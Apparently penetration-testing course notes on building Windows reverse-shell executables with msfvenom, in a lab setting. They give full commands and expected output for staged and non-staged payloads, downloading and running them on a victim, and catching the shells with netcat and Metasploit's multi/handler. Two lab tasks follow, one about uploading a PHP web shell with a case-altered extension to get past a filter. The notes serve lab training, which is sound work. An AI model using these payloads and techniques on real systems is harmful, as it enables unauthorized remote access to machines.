# Executable Payloads

Creating a Windows executable with a reverse shell payload
>``` shell
>kali@kali:~$ msfvenom -l payloads --platform windows --arch x64 
>
># ========== Expected Result ==========
>...
>windows/x64/shell/reverse_tcp               Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)
>...
>windows/x64/shell_reverse_tcp               Connect back to attacker and spawn a command shell (Windows x64)
>...
># =====================================
>```

Creating a Windows executable with a non-staged TCP reverse shell payload
>``` shell
>kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
>
># ========== Expected Result ==========
>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
>[-] No arch selected, selecting arch: x64 from the payload
>No encoder specified, outputting raw payload
>Payload size: 460 bytes
>Final size of exe file: 7168 bytes
>Saved as: nonstaged.exe
># =====================================
>```

Download non-staged payload binary and execute it
>``` shell
>PS C:\Users\justin> iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
>
>PS C:\Users\justin> .\nonstaged.exe
>```

Incoming reverse shell from non-staged Windows binary
>``` shell
>kali@kali:~$ nc -nvlp 443 
>
># ========== Expected Result ==========
>listening on [any] 443 ...
>connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50822
>Microsoft Windows [Version 10.0.20348.169]
>(c) Microsoft Corporation. All rights reserved.
>
>C:\Users\justin>
># =====================================
>```

Creating a Windows executable with a staged TCP reverse shell payload
>``` shell
>kali@kali:~$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe 
>
># ========== Expected Result ==========
>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
>[-] No arch selected, selecting arch: x64 from the payload
>No encoder specified, outputting raw payload
>Payload size: 510 bytes
>Final size of exe file: 7168 bytes
>Saved as: staged.exe
># =====================================
>```

Incoming reverse shell from staged Windows binary
>``` shell
>kali@kali:~$ nc -nvlp 443 
>
># ========== Expected Result ==========
>listening on [any] 443 ...
>connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50832
>whoami
># =====================================
>```

Set payload and options for multi/handler and launch it
>``` shell
>msf6 exploit(multi/http/apache_normalize_path_rce) > use multi/handler
>
># ========== Expected Result ==========
>[*] Using configured payload generic/shell_reverse_tcp
># =====================================
>
>msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
>
># ========== Expected Result ==========
>payload => windows/x64/shell/reverse_tcp
># =====================================
>
>msf6 exploit(multi/handler) > show options
>
># ========== Expected Result ==========
>...
>Payload options (windows/x64/shell/reverse_tcp):
>
>   Name      Current Setting  Required  Description
>   ----      ---------------  --------  -----------
>   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
>   LHOST                      yes       The listen address (an interface may be specified)
>   LPORT     4444             yes       The listen port
>...
># =====================================
>
>msf6 exploit(multi/handler) > set LHOST 192.168.119.2
>
># ========== Expected Result ==========
>LHOST => 192.168.119.2
># =====================================
>
>msf6 exploit(multi/handler) > set LPORT 443
>
>msf6 exploit(multi/handler) > run
>
># ========== Expected Result ==========
>[*] Started reverse TCP handler on 192.168.119.2:443 
># =====================================
>```

Incoming reverse shell from Windows binary with staged payload (1)
>``` shell
>[*] Started reverse TCP handler on 192.168.119.2:443 
>[*] Sending stage (336 bytes) to 192.168.50.202
>[*] Command shell session 6 opened (192.168.119.2:443 -> 192.168.50.202:50838) at 2022-08-01 10:18:13 -0400
>
>Shell Banner:
>Microsoft Windows [Version 10.0.20348.169]
>-----         
>
>C:\Users\justin> whoami
>
># ========== Expected Result ==========
>whoami
>brute2\justin
># =====================================
>```

Incoming reverse shell from Windows binary with staged payload (2)
>``` shell
>C:\Users\justin> exit
>
># ========== Expected Result ==========
>exit
>
>[*] 192.168.50.202 - Command shell session 6 closed.  Reason: User exit
># =====================================
>
>msf6 exploit(multi/handler) > run -j
>
># ========== Expected Result ==========
>[*] Exploit running as background job 1.
>[*] Exploit completed, but no session was created.
>
>[*] Started reverse TCP handler on 192.168.119.2:443 
># =====================================
>
>msf6 exploit(multi/handler) > jobs
>
># ========== Expected Result ==========
>Jobs
>====
>
>  Id  Name                    Payload                        Payload opts
>  --  ----                    -------                        ------------
>  1   Exploit: multi/handler  windows/x64/shell/reverse_tcp  tcp://192.168.119.2:443
>
>msf6 exploit(multi/handler) > 
>[*] Sending stage (336 bytes) to 192.168.50.202
>[*] Command shell session 7 opened (192.168.119.2:443 -> 192.168.50.202:50839) at 2022-08-01 10:26:02 -0400
># =====================================
>```

Lab 1 - Follow the steps from this section and use msfvenom to create a Windows binary with a staged TCP reverse shell payload. Start a multi/handler within Metasploit to receive the staged reverse shell from VM #1 once you execute the executable file on the system. Enter the command to list all payloads of msfvenom.
>``` shell
>
>```
>

Lab 2 - Use msfvenom to create a PHP web shell (bind or reverse shell), rename the PHP file extension to .pHP (as we did in the Module "Common Web Application Attacks" in the section "Using Executable Files"), and upload it to VM #2 to obtain an interactive shell. The flag is located in C:\xampp\passwords.txt.
>``` shell
>
>```
>
